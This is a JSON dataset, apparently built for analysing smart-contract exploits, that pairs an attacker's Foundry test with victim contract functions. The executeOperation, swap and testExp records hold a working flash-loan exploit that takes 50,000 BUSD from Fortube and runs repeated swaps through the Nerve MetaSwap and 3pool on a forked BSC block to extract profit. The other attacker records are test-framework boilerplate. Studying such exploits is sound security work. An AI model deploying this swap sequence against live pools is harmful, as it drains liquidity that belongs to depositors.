[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata params) external {\n        IERC20(busd).approve(fusdPool, type(uint256).max);\n        IERC20(fusd).approve(metaSwapPool, type(uint256).max);\n        IERC20(nerve3lp).approve(nerve3pool, type(uint256).max);\n        IERC20(busd).approve(metaSwapPool, type(uint256).max);\n\n        // 2. swap from 50000 busd to fusd on Ellipsis\n        IERC20(fusd).approve(fusdPool, type(uint256).max);\n        IcurveYSwap(fusdPool).exchange_underlying(1, 0, IERC20(busd).balanceOf(address(this)), 1);\n\n        for (uint8 i = 0; i < 7; i++) {\n            swap();\n        }\n\n        // 6. swap from fusd to busd on Ellipsis\n        IcurveYSwap(fusdPool).exchange_underlying(0, 1, IERC20(fusd).balanceOf(address(this)), 1);\n\n        // 7. payback flashloan\n        IERC20(busd).transfer(address(0xc78248D676DeBB4597e88071D3d889eCA70E5469), amount + fee);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        mainnetFork = vm.createFork(\"bsc\", 12_653_565);\n        vm.selectFork(mainnetFork);\n        cheats.label(address(flashloanProvider), \"flashloanProvider\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "swap",
    "original_code": "    function swap() public {\n        // 3. swap from fusd to Nerve 3-LP token on metaSwapPool\n        ISaddle(metaSwapPool).swap(0, 1, IERC20(fusd).balanceOf(address(this)), 1, block.timestamp);\n\n        // 4. remove liquidity Nerve.3pool with lp tokens to remove the liquidity of BUSD\n        ISwap(nerve3pool).removeLiquidityOneToken(IERC20(nerve3lp).balanceOf(address(this)), 0, 1, block.timestamp);\n\n        // 5. invoking the swapUnderlying function of MetaSwap to swap BUSD for fUSDT\n        ISaddle(metaSwapPool).swapUnderlying(1, 0, IERC20(busd).balanceOf(address(this)), 1, block.timestamp);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExp",
    "original_code": "    function testExp() public {\n        // 1. flashloan 50000 busd from fortube\n        flashloanProvider.flashloan(address(this), busd, 50_000 ether, \"0x\");\n        console.log(\"final busd profit: \", IERC20(busd).balanceOf(address(this)) / 10 ** IERC20(busd).decimals());\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IFortube",
    "source_type": "victim_contract",
    "function_name": "flashloan",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ISaddle",
    "source_type": "victim_contract",
    "function_name": "swapUnderlying",
    "original_code": "    function swapUnderlying(\n        uint8 tokenIndexFrom,\n        uint8 tokenIndexTo,\n        uint256 dx,\n        uint256 minDy,\n        uint256 deadline\n    )\n        external\n        virtual\n        nonReentrant\n        whenNotPaused\n        deadlineCheck(deadline)\n        returns (uint256)\n    {\n        return\n            swapStorage.swapUnderlying(\n                metaSwapStorage,\n                tokenIndexFrom,\n                tokenIndexTo,\n                dx,\n                minDy\n            );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISwap",
    "source_type": "victim_contract",
    "function_name": "removeLiquidityOneToken",
    "original_code": "    function removeLiquidityOneToken(\n        uint256 tokenAmount,\n        uint8 tokenIndex,\n        uint256 minAmount,\n        uint256 deadline\n    )\n        external\n        virtual\n        override\n        nonReentrant\n        whenNotPaused\n        deadlineCheck(deadline)\n        returns (uint256)\n    {\n        return\n            swapStorage.removeLiquidityOneToken(\n                metaSwapStorage,\n                tokenAmount,\n                tokenIndex,\n                minAmount\n            );\n    }\n\n",
    "description": ""
  }
]